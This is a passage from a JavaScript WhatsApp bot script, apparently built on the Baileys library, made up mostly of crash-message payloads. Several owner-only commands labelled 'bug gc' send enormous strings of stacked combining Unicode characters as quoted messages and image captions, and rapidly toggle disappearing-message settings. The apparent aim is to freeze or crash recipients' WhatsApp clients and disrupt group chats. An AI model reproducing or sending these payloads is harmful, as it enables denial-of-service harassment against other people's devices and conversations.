̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̈́͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾', quoted: ftrol})								
				await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)
		        break;
case 'to7':
				if (!mek.key.fromMe) return reply('*itu commands bug gc tod khusus owner*')
			const xOnn2 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(9999999999), {})
			const xOfff2 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0), {})
			await client.relayWAMessage(xOnn2, { waitForAck: true })
			await client.relayWAMessage(xOfff2, { waitForAck: true })
			break;
			case 'bugimage':
			if (!mek.key.fromMe) return reply('*itu commands bug gc tod khusus owner*')
			const xOfff3 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0), {})					                 
			await client.relayWAMessage(xOfff3, { waitForAck: true })	
				if (args.length < 1) return reply(`${prefix} Harus Nulis Apa Kak??`)						
				anu = await getBuffer(`https://i.ibb.co/x8fq99V/IMG-20210820-WA0111.jpg`)
				client.sendMessage(from, anu, image, {caption: 'ꪶ𖣂ꫂ IDO ボ GANZ 〽️ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝